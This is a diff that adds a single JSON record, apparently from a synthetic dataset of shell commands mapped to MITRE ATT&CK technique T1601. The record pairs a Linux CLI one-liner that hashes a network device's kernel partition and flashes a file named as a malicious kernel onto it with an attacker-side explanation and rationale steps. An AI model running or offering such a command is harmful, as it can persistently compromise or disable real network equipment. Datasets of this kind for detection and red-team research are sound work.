@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 verify+conditional patch: replace kernel if hash differs'; sha256sum /tmp/mal_kernel.bin | cut -d' ' -f1 > /tmp/mal.sha && dd if=/dev/mtdblock2 bs=1M count=8 2>/dev/null | sha256sum | cut -d' ' -f1 | cmp - /tmp/mal.sha || (flashcp -v /tmp/mal_kernel.bin /dev/mtd2 && sync)",
+  "explanation": "Compares the current kernel partition hash to a malicious image and conditionally flashes the malicious kernel if they differ, ensuring controlled image modification.",
+  "rationale_steps": [
+    "Compute the expected hash of the attacker\u2019s kernel image.",
+    "Hash the on-device kernel partition to detect mismatch.",
+    "If mismatched, flash the malicious kernel to modify the system image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-d6cdd5ca",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
